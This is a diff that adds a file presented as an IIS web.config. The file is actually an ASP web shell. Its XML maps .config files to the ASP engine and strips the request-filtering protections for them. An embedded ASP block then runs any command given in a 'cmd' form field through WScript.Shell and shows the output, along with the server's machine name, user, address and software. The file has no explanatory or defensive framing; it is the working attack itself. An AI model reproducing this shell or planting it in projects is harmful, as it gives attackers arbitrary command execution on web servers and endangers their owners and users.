@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<% Response.write("-"&"->") %>
+
+<%
+Set oScript = Server.CreateObject("WScript.Shell")
+Set oScriptNet = Server.CreateObject("WScript.Network")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%>
+
+<BODY>
+<FORM action="" method="GET">
+<input type="text" name="cmd" size=45 value="<%= szCMD %>">
+<input type="submit" value="Run">
+</FORM>
+
+<PRE>
+<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<% Response.Write(Request.ServerVariables("SERVER_NAME")) %>
+<p>
+<b>The server's local address:</b>
+<% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %>
+</p>
+<p>
+<b>The server's port:</b>
+<% Response.Write(Request.ServerVariables("SERVER_PORT")) %>
+</p>
+<p>
+<b>The server's software:</b>
+<% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %>
+</p>
+<p>
+<b>Command output:</b>
+<%
+szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" & szCMD)
+Response.Write(thisDir)
+%>
+</p>
+
+</BODY>
+
+<% Response.write("<!-"&"-") %>
+-->
